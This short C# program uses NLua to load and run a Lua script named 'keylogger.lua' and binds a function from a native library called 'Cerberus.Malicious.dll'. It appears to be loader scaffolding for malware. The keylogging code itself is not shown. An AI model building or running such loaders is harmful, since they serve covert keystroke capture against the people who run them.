using NLua;
using System.Runtime.InteropServices;

public class Program
{

    [DllImport("Cerberus.Malicious.dll")]
    public static extern int testMan();


    private static void Main(string[] args)
    {

        using (Lua lua = new Lua())
        {
            lua.DoFile("scripts\\keylogger.lua");
            LuaFunction testFunction = lua["testA"] as LuaFunction;
            testFunction.Call();
            //Console.WriteLine(x);

        }
        Console.ReadLine();

    }
}